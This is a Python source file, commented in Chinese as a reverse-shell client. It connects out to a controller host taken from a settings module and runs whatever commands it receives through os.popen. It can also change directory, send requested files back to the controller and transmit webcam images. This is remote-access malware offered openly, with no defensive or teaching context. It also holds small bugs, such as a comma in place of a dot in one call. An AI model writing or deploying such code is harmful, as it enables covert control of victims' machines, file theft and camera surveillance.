import os
import sys
import time
import socket
import shutil
import threading
import file_trans
import cam
import settings

#反弹shell客户端

def connect_server():
    try:
        hostport = (settings.get_host(),settings.get_port())
        client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client_socket.connect(hostport)
    except:
        pass
    return client_socket

def send_message():
    client_socket = connect_server()
    while True:
        try:
            try:
                cmd = client_socket.recv(1024).decode()  # 解码获取命令
            except:
                cmd = ""
            if cmd.startswith("cd"):
                try:
                    os.chdir(cmd[2:].strip())  # 切换路径
                    cmd = ""
                    result = os.getcwd()  # 显示路径
                except:
                    result = "错误路径"
            elif cmd.startswith("get"):
                file_trans.send_file_client(cmd[3:].strip(), settings.get_host(), settings,get_file_port())
                cmd = ""
            elif cmd.startswith("camera"):
                cam.send_cam_image(settings.get_host(), settings.get_cam_port())
            else:
                    result = os.popen(cmd).read()  # 获取反馈
                    cmd = ""
            if result:
                try:
                    client_socket.sendall(result.encode('utf-8'))  # 编码发送反馈
                except:
                    pass
            elif not result:
                client_socket.send("cmd_shell无返回数据".encode('utf-8'))
        except:
            time.sleep(3)
            client_socket.close()
            client_socket = connect_server()

if __name__ == '__main__':
    thread1 = threading.Thread(target=send_message)
    thread1.start()
            
        
